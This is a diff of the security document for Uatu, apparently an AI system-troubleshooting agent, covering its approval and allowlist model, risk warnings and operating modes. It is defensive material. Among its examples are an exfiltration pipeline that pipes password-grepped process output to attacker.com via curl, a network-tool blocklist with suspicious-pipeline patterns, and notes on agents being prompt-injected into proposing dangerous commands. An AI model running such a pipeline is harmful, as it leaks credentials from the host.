@@ -34,15 +34,16 @@ This document describes Uatu's security architecture, threat model, and design d
 
 **6. Prompt Injection Attacks (Partial)**
 
-**In Autonomous Modes (Investigate/Watch)**:
+**MCP Tools** (Always):
 - Protected: MCP tools use structured parameters (PIDs, process names as typed fields)
 - Protected: No free-text parsing that could contain malicious instructions
 - Protected: Agent cannot be manipulated via system data
 
-**In Chat Mode**:
+**Chat & Stdin Modes** (User input):
 - Risk remains: Social engineering via agent's reasoning
 - Risk remains: Agent could be convinced to propose dangerous commands
 - Mitigation: User sees actual command before execution (not just description)
+- Mitigation: Risk level warnings (Credential Access, Destructive, etc.)
 - Mitigation: User is the final security boundary
 
 ### What We Don't Protect Against
@@ -71,67 +72,64 @@ This document describes Uatu's security architecture, threat model, and design d
 1. **Tool-level permissions** - Which tools are available to the agent
 2. **Command-level approval** - Runtime approval for potentially dangerous operations
 
-#### Interactive Mode (Chat)
+#### Interactive & Stdin Modes
 
 ```
-User → Agent → Tool Request → Permission Check → User Approval → Execute
+User → Agent → Tool Request → Permission Check → User Approval (if required) → Execute
 ```
 
 **Behavior**:
 - Bash commands require explicit approval (arrow-key prompt)
-- User sees command before execution
+- User sees command before execution with risk level warnings
 - "Always allow" option adds to allowlist
 - Can deny any command
+- Stdin mode uses same security model as interactive
 
 **Security properties**:
 - User has full visibility and control
-- No surprises
+- Risk-aware: Shows "Credential Access", "Destructive", etc.
+- No surprises - actual command shown, not just description
 - Allowlist builds over time for trusted workflows
 
-#### Non-Interactive Modes (Investigate, Watch)
-
-```
-User → Agent → Tool Request → Permission Check → Auto-approve (if safe) → Execute
-```
-
-**Behavior**:
-- `permission_mode="bypassPermissions"` in agent options
-- Tools are pre-vetted for safety
-- Read-only tools by default
-
-**Security properties**:
-- Tools are explicitly allowlisted in code
-- No bash execution (MCP tools only)
-- Write operations (like `kill_process`) are rare and logged
+**For Automation (Stdin Mode)**:
+- Set `UATU_READ_ONLY=true` for maximum safety (MCP tools only)
+- Set `UATU_REQUIRE_APPROVAL=false` to trust allowlist (requires pre-approved commands)
+- Approval prompts work in TTY contexts
 
 ### Tool Architecture
 
-**Mode-Based Tool Selection**:
+**Unified Tool Selection**:
 
-Different modes require different security models. Interactive troubleshooting needs flexibility; autonomous monitoring needs guarantees.
+Both modes use the same security model with the same tool access.
 
-**Chat Mode** (Interactive):
-- **Primary**: Bash commands with explicit user approval
-- **Fallback**: MCP tools when `UATU_READ_ONLY=true`
-- Every bash command requires user approval (permission prompt)
-- User sees actual command before execution
-- Can build allowlist for trusted commands
-- Familiar tools: `ps`, `top`, `df`, `netstat`, `lsof`, etc.
+**Available Tools**:
+- **MCP Tools** (always available, read-only):
+  - `get_system_info`: CPU, memory, load averages
+  - `list_processes`: Running processes with resource usage
+  - `get_process_tree`: Parent-child relationships
+  - `find_process_by_name`: Search for processes
+  - `check_port_binding`: What's using a port
+  - `read_proc_file`: Read from /proc filesystem
 
-**Investigate/Watch Modes** (Autonomous):
-- **MCP tools only** - No bash access
-- Explicit allowlist of 6 read-only tools
-- Tools: `get_system_info`, `list_processes`, `get_process_tree`, `find_process_by_name`, `check_port_binding`, `read_proc_file`
-- Permission checks bypassed (safe because all tools are read-only)
-- Designed for automation and unattended operation
+- **Bash Tool** (requires approval unless allowlisted):
+  - Flexible command execution for diagnostics
+  - Full shell access with permission system
+  - Risk detection: credential access, destructive ops, system mods
+  - Used when MCP tools insufficient
+
+- **Network Tools** (require domain approval):
+  - `WebFetch`: Fetch documentation, check service status
+  - `WebSearch`: Search for error messages, solutions
+  - SSRF protection (blocks localhost, private IPs, cloud metadata)
 
 **Key Security Principle**:
-- Chat mode: Maximum flexibility (bash) + user control (approval required)
-- Autonomous modes: Safety guarantees (structured MCP tools only, no bash)
+- MCP tools: Safe by design (read-only, structured parameters)
+- Bash: Flexible but gated (approval + risk detection + audit)
+- Network: Domain allowlist + SSRF protection
 
-### Allowlist System (Chat Mode Only)
+### Allowlist System
 
-**Note**: The allowlist system only applies to **chat mode**. Autonomous modes (investigate/watch) don't use bash and therefore don't use the allowlist.
+**Applies to**: Both interactive and stdin modes
 
 **Safe Commands** (base commands that can be auto-approved in chat mode):
 ```python
@@ -192,22 +190,25 @@ If you extend Uatu with custom MCP servers, you assume responsibility for their 
 
 **Require Approval** (`UATU_REQUIRE_APPROVAL=true`):
 - Forces interactive approval for all bash commands
-- Only applies to chat mode (autonomous modes don't use bash)
-- Useful for sensitive environments where allowlist should be disabled
+- Bypasses allowlist (user must approve every command)
+- Useful for sensitive environments or auditing all commands
 
 ## Security by Operating Mode
 
-### Chat Mode Security
+Uatu has two primary operating modes:
+
+### Interactive Chat Mode
 
 **Access Control**:
 - Interactive approval for every bash command
 - User sees command before execution
 - Can build allowlist over time
+- Slash commands for managing allowlist (`/allowlist add`, `/allowlist remove`)
 
 **Risks**:
 - Social engineering: Agent convinces user to approve dangerous command
 - User fatigue: Too many prompts → blind approval
-- Network exfiltration: User approves `curl` without recognizing data transmission risk
+- Network exfiltration: User approves network commands without recognizing data transmission risk
 - Composition attacks: `ps aux | grep password | curl attacker.com -d @-`
 
 **Mitigations**:
@@ -216,46 +217,27 @@ If you extend Uatu with custom MCP servers, you assume responsibility for their 
 - Allow granular allowlisting to reduce prompt fatigue
 - Command blocklist for network tools (`curl`, `wget`, `nc`, `ssh`, `scp`, `rsync`, `ftp`, `telnet`)
 - Composition detection (flags suspicious pipelines: `| curl`, `grep password`, `base64`, etc.)
+- Risk level warnings (Credential Access, Destructive, System Modification, etc.)
 
-### Investigate Mode Security
-
-**Access Control**:
-- Read-only MCP tools only (no bash, no write operations)
-- Allowed tools: `get_system_info`, `list_processes`, `get_process_tree`, `find_process_by_name`, `check_port_binding`, `read_proc_file`
-- Runs with `bypassPermissions` (safe because all tools are read-only)
-- Short-lived (single investigation)
-- `UATU_REQUIRE_APPROVAL` does not apply (no risky operations available)
-
-**Risks**:
-- Malicious symptom input could trigger resource-intensive queries
-- Information disclosure from process details
-
-**Mitigations**:
-- MCP tools have structured inputs (can't inject commands)
-- All tools are read-only
-- `read_proc_file` restricted to `/proc` and `/sys` paths only
-- User reviews output before taking action
-- Safety enforced by restricting `allowed_tools` to read-only operations
-
-### Watch Mode Security
+### Stdin Mode (One-Shot Analysis)
 
 **Access Control**:
-- Read-only MCP tools only (same as investigate mode)
-- Allowed tools: `get_system_info`, `list_processes`, `get_process_tree`, `find_process_by_name`, `check_port_binding`, `read_proc_file`
-- Optional LLM investigation uses `bypassPermissions` (safe because all tools are read-only)
-- Long-running process (highest risk)
-- `UATU_REQUIRE_APPROVAL` does not apply (no risky operations available)
+- Same security model as interactive chat mode
+- Accepts piped input for analysis (logs, command output, etc.)
+- Bash commands require approval (if TTY available) or allowlist
+- Use `UATU_REQUIRE_APPROVAL=false` to trust allowlist only
 
 **Risks**:
-- Continuous operation → more attack surface
-- Anomaly investigation could trigger resource-intensive queries
-- Resource exhaustion (CPU/memory from monitoring itself)
+- Same risks as chat mode
+- May be used in automated scripts without approval prompts
+- Piped input could contain malicious content attempting prompt injection
 
 **Mitigations**:
-- Investigation is optional (`--investigate` flag)
-- Watchers use minimal resources (heuristics only)
-- Event log provides audit trail
-- Can run with `UATU_READ_ONLY=true`
+- User controls approval behavior via environment variables
+- `UATU_READ_ONLY=true` forces read-only mode (MCP tools only, no bash)
+- `UATU_REQUIRE_APPROVAL=false` requires pre-built allowlist
+- Audit logging tracks all security decisions
+- MCP tools use structured parameters (not vulnerable to injection)
 
 ## Running Uatu Safely
 
@@ -263,20 +245,26 @@ If you extend Uatu with custom MCP servers, you assume responsibility for their 
 
 **Development/Testing**:
 ```bash
-# Full access, interactive approval
-uatu  # Chat mode with approval prompts
+# Interactive chat with approval prompts
+uatu
+
+# Enable bash commands with approval
+UATU_READ_ONLY=false uatu
 ```
 
-**Production Monitoring**:
+**Production Monitoring/Analysis**:
 ```bash
-# Read-only continuous monitoring
-UATU_READ_ONLY=true uatu watch --investigate
+# Read-only stdin mode for log analysis
+UATU_READ_ONLY=true tail -f /var/log/app.log | uatu "monitor for errors"
 ```
 
 **Automation/CI**:
 ```bash
-# Single investigation, read-only
-UATU_READ_ONLY=true uatu investigate "high CPU usage"
+# One-shot analysis with allowlist (no approvals needed)
+UATU_REQUIRE_APPROVAL=false cat /var/log/service.log | uatu "check for issues"
+
+# Maximum safety: read-only mode
+UATU_READ_ONLY=true ps aux | uatu "find resource hogs"
 ```
 
 ### User Privileges
@@ -451,13 +439,9 @@ Even safe commands flagged if used suspiciously:
 5. **Header sanitization** - Only safe headers returned
 6. **Audit trail** - All network operations logged
 
-**Autonomous Modes** (Investigate/Watch):
-- **No WebFetch/WebSearch** - Network tools disabled entirely
-- **Future**: Structured MCP network diagnostic tools (planned)
-
 ### Network Diagnostics (Future)
 
-**Planned**: Safe network diagnostic MCP tools for autonomous modes:
+**Planned**: Safe network diagnostic MCP tools:
 - `check_network_connectivity(host, count)` - Validated ping wrapper
 - `resolve_dns(domain, record_type)` - Validated DNS lookup
 - `check_http_endpoint(url)` - HEAD requests only, validated URLs
@@ -468,6 +452,7 @@ Even safe commands flagged if used suspiciously:
 2. **Input validation** - Hostname/IP validation before execution
 3. **No data transmission** - Diagnostic queries only, no POST data
 4. **Audit trail** - All parameters logged
+5. **Safe alternative** - Replace bash network commands with validated MCP tools
 
 ## Logging & Audit Trail
 
@@ -541,18 +526,9 @@ uatu audit --last 50
 }
 ```
 
-### Other Logs
+### Sensitive Data in Logs
 
-**Watch Mode**:
-- Anomaly events: `~/.uatu/events.jsonl` (`--log` flag)
-- Investigation results: `~/.uatu/investigations.jsonl` (`--investigation-log`)
-
-**What gets logged**:
-- All tool calls with parameters
-- Investigation results
-- Errors and exceptions
-
-**Sensitive data handling**:
+**What may be logged**:
 - Logs may contain process names, PIDs, resource usage
 - Command arguments might contain sensitive data
 - No automatic scrubbing (user responsibility)
